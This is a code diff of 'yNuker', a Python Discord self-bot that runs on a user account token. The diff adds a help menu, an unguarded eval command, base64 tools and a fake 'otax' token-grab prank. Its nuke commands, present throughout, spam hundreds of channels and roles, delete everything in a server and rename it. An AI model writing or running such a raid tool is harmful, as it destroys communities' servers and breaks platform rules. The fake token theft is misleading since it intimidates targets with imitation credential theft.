@@ -18,29 +18,31 @@ LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 SOFTWARE."""
 
+
+import os
 import asyncio
 import discord
-from discord.embeds import Embed
 from discord.ext import commands
 from os import name as os_name, system
 from colorama import init, Fore
 from discord.ext.commands import CommandNotFound
-import requests
 import os 
 import json
 import sys
 import time
-import random
+import random, string
 import asyncio
-
+import requests
+import inspect
+import base64
 TITLE = "yNuker"
-VERSION = "0.1"
+VERSION = "0.3"
 
 
 config = json.load(open("config.json", "r"))
 clear = lambda: os.system('cls' if os.name in ('nt', 'dos') else 'clear')
 
-
+tips = ["This bot is not case sensitive", "I am not responsible for what happens to your account.", "idk what to write", "https://github.com/YeetDisDdue"]
 clear()
 loading = f'''
 {Fore.LIGHTCYAN_EX}
@@ -52,7 +54,6 @@ loading = f'''
                                    ╚══════╝ ╚════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚══╝ ╚═════╝ ╚═╝╚═╝╚═╝
 '''
 
-
 def banner():
     sys.stdout.buffer.write(f'''\
 {Fore.LIGHTRED_EX}
@@ -63,11 +64,7 @@ def banner():
                                    ██║   ██║ ╚███║╚██████╔╝██║ ╚██╗███████╗██║  ██║
                                    ╚═╝   ╚═╝  ╚══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝     
 '''.encode('utf8'))
-
-                                       
-
-#json shit
-token = config["token"] 
+token = config["token"]
 prefix = config["prefix"]
 everyoneMsg = config["everyoneMsg"]
 chName = config["chName"]
@@ -76,16 +73,17 @@ vcName = config["vcName"]
 ghostpingmsg = config["ghostpingmsg"]
 catName = config["catName"]
 serverName = config["serverName"]
-
+webhookName = config["webhookName"]
 #non json config
 icon = requests.get("https://cdn.discordapp.com/emojis/914075850998173706.png?size=160").content
 
-
 clear()
+randomtips = random.choice(tips)
 print(loading)
+print(f"                                   random message: {randomtips}")
 
 
-client = commands.Bot(command_prefix=prefix, case_insensitive=True, self_bot=True)
+client = commands.Bot(command_prefix=prefix, case_insensitive=True, self_bot=True, help_command=None)
 
 @client.event
 async def on_ready():
@@ -93,20 +91,21 @@ async def on_ready():
     time.sleep(1)
     clear()
     banner()
-    print(f'                                                {Fore.RED}yNuker ready.')
+    print(f'                                                {Fore.RED}yNuker {Fore.WHITE}ready{Fore.LIGHTRED_EX}.')
     print(f'                                 {Fore.LIGHTRED_EX}Hello, {Fore.LIGHTWHITE_EX}{client.user.name}#{client.user.discriminator}! {Fore.LIGHTRED_EX}| {Fore.LIGHTWHITE_EX}{client.user.id}')
     print(f'                                        {Fore.LIGHTRED_EX}You are curently in {Fore.WHITE}{len(client.guilds)} {Fore.LIGHTRED_EX}servers.')
+    print(f'                                              {Fore.WHITE}{prefix}help {Fore.LIGHTRED_EX}for all commands.')
     print(f'''
                 
                                                      {Fore.LIGHTRED_EX}Commands
-                                       {prefix}createAll  |   {prefix}delAll  |  {prefix}createCat
+                                       {prefix}createAll  |   {prefix}delAll  |  {prefix}wip
                                       {prefix}createRole  |  {prefix}createVc | {prefix}guildEdit
                                                        {Fore.RED}{prefix}nuke
                                         
                                    {Fore.LIGHTRED_EX}==================Others=================
                                    
-                                       {prefix}ping     |   {prefix}snipe   | {prefix}ghostping
-                                       {prefix}bitcoin  |   {prefix}
+                                       {prefix}ping     |   {prefix}soi   | {prefix}ghostping
+                                       {prefix}base  |   {prefix}e
                                        {Fore.WHITE}
                                    ''')                                
 cmds = ''
@@ -118,47 +117,24 @@ async def on_command_error(ctx, error):
     raise error
 
 @client.command()
-async def guildEdit(ctx):
-    await ctx.message.delete()
-    await ctx.guild.edit(name=f"{serverName}")
-    await ctx.guild.edit(icon=icon)
-
-
-@client.command()
-async def createCat(ctx):
-    await ctx.message.delete()
-    print(f"- Creating categories. {catName}")
-    for i in range(400):
-        guild = ctx.guild
-        await ctx.guild.create_category(f"{catName}")
-        print("Success.")
-
-@client.command()
-async def createVc(ctx):
-    await ctx.message.delete()
-    print(f"- Creating voice channels. {vcName}")
-    for i in range(400):
-        guild = ctx.guild
-        await ctx.guild.create_text_channel(f"{vcName}")
-        print("Success.")
-
-
-async def roles(guild):
-  print(f"- Creating roles. {roleName}")
-  for x in range(250):
-    await guild.create_role(name=f"{roleName}")
-
-async def channels(guild):
-  print(f"- Creating channels. {chName}")
-  for x in range(500):
-    await guild.create_text_channel(f"{chName}")
-
-@client.command()
-async def createAll(ctx):
-    tasks = [roles(ctx.guild), channels (ctx.guild)]
-    await asyncio.gather(*tasks)
-
-
+async def help(ctx):
+  await ctx.send(f"""
+```yNuker Commmands
+  Nuke
+    {prefix}createAll - Creates channels and roles
+    {prefix}createVc - Creates Voice Chnnels
+    {prefix}delAll - Deleted everything in the server
+    {prefix}guildEdit: edits the server/guild's name and icon
+  Tools
+     {prefix}ebase - base64 encode
+     {prefix}dbase - base64 decode
+     {prefix}e - eval python code
+  Others
+    {prefix}help - this
+    {prefix}ping - your bot ping
+    {prefix}soi - sends a random shot on iphone
+    {prefix}otax - get anyone's token (dont otax your self )
+    ```""")
 @client.command()
 async def delAll(ctx):
     await ctx.message.delete()
@@ -186,64 +162,105 @@ async def delAll(ctx):
 
     print("I have deleted everything.")
 
-#======================================================others section=================================
+async def roles(guild):
+  print(f"- Creating roles. {roleName}")
+  for x in range(250):
+    await guild.create_role(name=f"{roleName}")
+
+async def channels(guild):
+  print(f"- Creating channels. {chName}")
+  for x in range(500):
+    await guild.create_text_channel(f"{chName}")
+@client.command()
+async def createAll(ctx):
+    tasks = [roles(ctx.guild), channels (ctx.guild)]
+    await asyncio.gather(*tasks)
+
+@client.command()
+async def createVc(ctx):
+    await ctx.message.delete()
+    print(f"- Creating voice channels. {vcName}")
+    for i in range(400):
+        guild = ctx.guild
+        await ctx.guild.create_text_channel(f"{vcName}")
+        print("Success.")
+
+@client.command()
+async def guildEdit(ctx):
+    await ctx.message.delete()
+    await ctx.guild.edit(name=f"{serverName}")
+    await ctx.guild.edit(icon=icon)
+
+@client.command()
+async def createRole(ctx):
+    await ctx.message.delete()
+    print(f"- Creating voice channels. {vcName}")
+    for i in range(400):
+        guild = ctx.guild
+        await ctx.guild.create_text_channel(f"{vcName}")
+        print("Success.")
+  
+
+
+
+#===============others====================
 
 @client.command(name="ping")
 async def ping(ctx):
-    embed=discord.Embed(
-         title="Pong!",
-         description=(f"{round(client.latency * 1000)}ms."),
-         color=0x09c809)
-    await ctx.send(embed=embed)
+  await ctx.send(f"```Ping\n{round(client.latency * 1000)}ms.```")
 
-#snipe command
-snipe_message_content = None
-snipe_message_author = None
-
-@client.event
-async def on_message_delete(message):
-    global snipe_message_content
-    global snipe_message_author
-
-
-    snipe_message_content = message.content
-    snipe_message_author = message.author.name 
-    await asyncio.sleep(60)  
-    snipe_message_author = None 
-    snipe_message_content = None
 
 @client.command()
-async def snipe(message):
-    if snipe_message_content==None:
-        
-        await message.channel.send("I can't find anything to snipe.")
-    else:
-        embed = discord.Embed(description=f"{snipe_message_content}")
-        embed.set_footer(text=f"{prefix}snipe sent by {message.author.name}#{message.author.discriminator}")
-        embed.set_author(name = f"Message by {snipe_message_author} sniped.")
-        await message.channel.send(embed=embed)
-        return
-#snipe command
+async def soi(ctx):
+  r = requests.get("https://apiv2.spapi.ga/fun/soi")
+  r = r.json()
+  video = r["video"]
+  await ctx.send(video)
 
 @client.command()
-async def ghostping(ctx):
-    await ctx.message.delete()
-    await ctx.send(f'{ghostpingmsg}', delete_after=0)
+async def ebase(ctx, *, args=None):
+  if args is None:
+    await ctx.send("```Missing argument.```")
+  else:
+    encodedBytes = base64.b64encode(args.encode("utf-8"))
+    encodedStr = str(encodedBytes, "utf-8")
+    await ctx.send(f"```base64: {encodedStr}```")
 
-@client.command(aliases=['bitcoin'])
-async def btc(ctx):
-    r = requests.get(
-        'https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR')
-    r = r.json()
-    usd = r['USD']
-    eur = r['EUR']
-    em = discord.Embed(description=f'USD: `{str(usd)}$`\nEUR: `{str(eur)}€`')
-    em.set_author(
-        name='Bitcoin',
-        icon_url=
-        'https://cdn.pixabay.com/photo/2013/12/08/12/12/bitcoin-225079_960_720.png'
-    )
-    await ctx.send(embed=em)
+@client.command()
+async def dbase(ctx, *, args=None):
+  if args is None:
+    await ctx.send("```Missing argument.```")
+  else:
+    decoded = base64.b64decode(args).decode('utf-8')
+    await ctx.send(f"```base64 decoded: {decoded}```")
+
+@client.command()
+async def e(ctx, *, code=None):
+    try:
+        if code.startswith("await "):
+            code = code[6:]
+        output = eval(code)
+        if inspect.isawaitable(output):
+            output = await output
+        await ctx.send(f"```ini\n[Input]\n```\n```py\n{code}```\n```ini\n[Output]\n```\n```py\n{output}\n```")
+    except Exception as e:
+        await ctx.send(f"```ini\n[Error]\n```\n```py\n{e}\n```")
 
 
+@client.command()
+async def otax(ctx, user: discord.User = None):
+  tokenstart = ["mfa.", "OTD", "OTM"]
+  second = ["grhyq8", "86dxr0", "u3m_i1", "oc83gg", "xrjzmh", "_huysv", "turs9o", "8ot1yz", "xx5h5m"]
+  third = ''.join(random.choices(string.ascii_uppercase + string.digits, k=15))
+  if user is None:
+    await ctx.send("You need to provide someone to otax, you cant otax your self")
+  else:
+    message = await ctx.send(f"```Sending Friend Request...```")
+    time.sleep(2)
+    await message.edit(content="```Got token.```")
+    time.sleep(1)
+    await message.edit(content="```Declining Friend Request```")
+    time.sleep(2)
+    await message.edit(content=f"> Otaxed {user.mention}\n`token: {random.choice(tokenstart)}{base64.b64encode(str(user.id).encode('utf-8')).decode('ascii')}.{random.choice(second)}.{third}`")
 client.run(token, bot=False)
+
